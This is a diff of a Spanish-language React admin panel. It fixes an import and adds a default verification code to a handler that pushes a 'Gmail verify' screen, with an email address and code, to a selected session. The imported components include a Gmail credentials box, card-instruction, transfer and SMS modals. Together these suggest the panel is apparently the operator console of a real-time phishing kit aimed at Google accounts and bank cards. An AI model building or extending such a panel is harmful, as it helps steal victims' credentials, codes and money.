@@ -13,7 +13,7 @@ import SmsManagement from '@/components/admin/SmsManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal } from '@/components/admin/Modals';
 import { GmailModal } from '@/components/admin/GmailModal';
 import { GmailVerifyModal } from '@/components/admin/GmailVerifyModal';
-import GmailCredentialsBox from '@/components/admin/GmailCredentialsBox';
+import { GmailCredentialsBox } from '@/components/admin/GmailCredentialsBox';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
@@ -689,16 +689,21 @@ export default function AdminPanel() {
   
   const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
     if (selectedSessionId) {
+      // Asegurar que el código nunca esté vacío
+      const codigoVerificacion = data.codigo && data.codigo.trim() !== '' ? data.codigo : '14';
+      
+      console.log('Enviando solicitud de verificación Google con código:', codigoVerificacion);
+      
       sendScreenChange({
         tipo: `mostrar_${ScreenType.GMAIL_VERIFY}`,
         sessionId: selectedSessionId,
         correo: data.correo,
-        codigo: data.codigo || '14' // Usar 14 como valor predeterminado si no se proporciona
+        codigo: codigoVerificacion
       });
       
       toast({
         title: "Verificación de Google enviada",
-        description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${data.codigo || '14'}`,
+        description: `Se ha solicitado la verificación de Google para: ${data.correo} con código: ${codigoVerificacion}`,
       });
     }
     
